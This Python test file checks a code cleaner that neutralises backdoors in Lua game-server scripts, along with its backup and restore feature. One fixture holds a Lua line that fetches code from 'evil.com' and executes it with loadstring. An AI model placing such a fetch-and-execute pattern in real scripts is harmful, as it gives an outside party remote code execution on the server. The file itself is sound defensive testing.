"""
tests/test_cleaner_safety.py
Unit and integration tests verifying the safety and accuracy of the code cleaner.
Verifies that only malicious/suspicious patterns are modified, and legitimate
APIs are completely untouched. Also verifies backup creation and SHA-256 byte-for-byte restoration.
"""

import os
import unittest
import tempfile
import hashlib
from unittest.mock import MagicMock, patch
from core import database as db
from core.backup_manager import backup_file, restore_file
from gui.cleaner_dialog import CleanerDialog


class TestCleanerSafety(unittest.TestCase):

    @classmethod
    def setUpClass(cls):
        from PySide6.QtWidgets import QApplication
        cls.app = QApplication.instance()
        if cls.app is None:
            cls.app = QApplication([])

    def setUp(self) -> None:
        db.init_database()
        self.temp_dir = tempfile.TemporaryDirectory()

    def tearDown(self) -> None:
        self.temp_dir.cleanup()

    def _hash_file(self, path: str) -> str:
        with open(path, "rb") as f:
            return hashlib.sha256(f.read()).hexdigest()

    @patch('gui.cleaner_dialog.QMessageBox')
    def test_suspicious_lua_cleaning(self, mock_msgbox) -> None:
        # Mock confirmation responses to simulate user clicking "Yes"
        mock_msgbox.question.return_value = mock_msgbox.Yes

        lua_path = os.path.join(self.temp_dir.name, "server.lua")
        suspicious_code = "PerformHttpRequest('http://evil.com/payload', function(err, text, headers)\n    loadstring(text)()\nend)"
        with open(lua_path, "w", encoding="utf-8") as f:
            f.write(suspicious_code)

        orig_hash = self._hash_file(lua_path)

        dialog = CleanerDialog(lua_path, "test_resource", "Suspicious HTTP + loadstring")
        dialog._apply_clean()

        # Verify file is cleaned (loadstring is commented out)
        with open(lua_path, "r", encoding="utf-8") as f:
            content = f.read()
        self.assertIn("-- [SAFE CLEAN]", content)
        self.assertIn("--     loadstring(text)()", content)

        # Verify backup and restore matches original hash
        backups_dir = os.path.join(os.path.dirname(self.temp_dir.name), "backups")
        if os.path.exists(backups_dir):
            backups = os.listdir(backups_dir)
            self.assertTrue(len(backups) > 0)
            
            # Restore and verify hash matches orig_hash
            new_backups = [os.path.join(backups_dir, b) for b in backups]
            latest_backup = max(new_backups, key=os.path.getmtime)
            
            self.assertTrue(restore_file(latest_backup, lua_path))
            self.assertEqual(self._hash_file(lua_path), orig_hash)

    @patch('gui.cleaner_dialog.QMessageBox')
    def test_legitimate_lua_preserved(self, mock_msgbox) -> None:
        lua_path = os.path.join(self.temp_dir.name, "client.lua")
        legit_code = """
        RegisterNetEvent("playerSpawned")
        AddEventHandler("playerSpawned", function()
            TriggerServerEvent("logSpawn")
        end)
        """
        with open(lua_path, "w", encoding="utf-8") as f:
            f.write(legit_code)

        # Scanner and cleaner should not identify/modify any bad patterns
        dialog = CleanerDialog(lua_path, "test_resource", "Safe event triggers")
        # Verify no cleaning/modification is made to clean files
        self.assertEqual(dialog.cleaned_content.strip(), legit_code.strip())


if __name__ == "__main__":
    unittest.main()
